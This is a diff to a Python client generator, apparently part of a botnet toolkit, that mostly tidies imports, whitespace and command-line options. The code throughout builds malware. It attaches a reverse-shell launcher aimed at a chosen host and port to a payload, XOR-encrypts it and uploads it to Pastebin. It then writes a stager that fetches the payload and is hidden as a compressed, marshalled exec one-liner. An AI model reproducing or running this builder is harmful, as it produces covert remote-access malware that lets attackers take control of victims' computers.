@@ -16,14 +16,18 @@ import base64
 import urllib
 import urllib2
 import marshal
-import colorama
 import argparse
 import subprocess
 
-# modules
+# external modules
+
+import colorama
+
+# package modules
 
 import modules.security as security
 import modules.util as util
+
 
 colorama.init(autoreset=False)
 
@@ -50,7 +54,7 @@ def exe(options, filename, payload='modules/payload.py'):
 
 
 def app(options, filename):
-    try:        
+    try:
         iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
         version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
         baseName        = os.path.basename(filename)
@@ -79,38 +83,27 @@ def app(options, filename):
 
 
 def py(options, payload='modules/payload.py', stager='modules/stager.py'):
-    
         key  = base64.b64encode(os.urandom(16))
-        path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3)) if not options.name else (options.name
-
+        path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3) if not options.name else options.name)
         with open(payload, 'r') as fp:
-            load = fp.read()            
-
+            load = fp.read()
         load = load + "\n\nif __name__ == '__main__':\n    _shell = shell(host='{}', port={}, **{})\n    _shell.run()".format(options.host, options.port, json.dumps({k:v for k, v in options._get_kwargs() if k in ('ftp','imgur','paste')}))
         code = security.encrypt_xor(load, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
         diff = round(float(100.0 * float(float(len(code))/float(len(load)) - 1.0)))
-                                                                                                                                                    
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(load), 'increased' if len(code) > len(load) else 'reduced', len(code), diff, 'larger' if len(code) > len(load) else 'smaller').ljust(80 - len("[+] ")))
-
         load = code
         link = util.pastebin(load)
-                                                                                                                                                    
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(load), link).ljust(80 - len("[+] ")))
-
         with open(stager, 'r') as fp:
             stag = fp.read().replace('__KEY__', key).replace('__PAYLOAD__', link)
-            
         code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stag, '', 'exec')), 9))))
         diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stag)))))
-                                                                                                                                                    
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stag), 'increased' if len(code) > len(stag) else 'reduced', len(code), diff, 'larger' if len(code) > len(stag) else 'smaller').ljust(80 - len("[+] ")))
-                                                                                                                              
         with file(path, 'w') as fp:
             fp.write(stag)
-        
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stag), path).ljust(80 - len("[+] ")))
         return path
@@ -121,9 +114,7 @@ def main():
         parser.add_argument('host', action='store', type=str, help='server IP to connect to', default='localhost')
         parser.add_argument('port', action='store', type=int, help='port number for connection', default=1337)
         parser.add_argument('--name', action='store', type=str, help='Output file name')
-        parser.add_argument('--icon', action='store', type=str, help='Output file icon')
-        parser.add_argument('--api', dest='key-value', type=str, help='API key name and value', action='store')
-        parser.add_argument('--ftp', dest='host-user-pass', type=str, help='FTP login credentials', action='store')
+        parser.add_argument('--icon', action='store', type=str, help='A valid path file icon')
         options = parser.parse_args()
         return py(options)
 
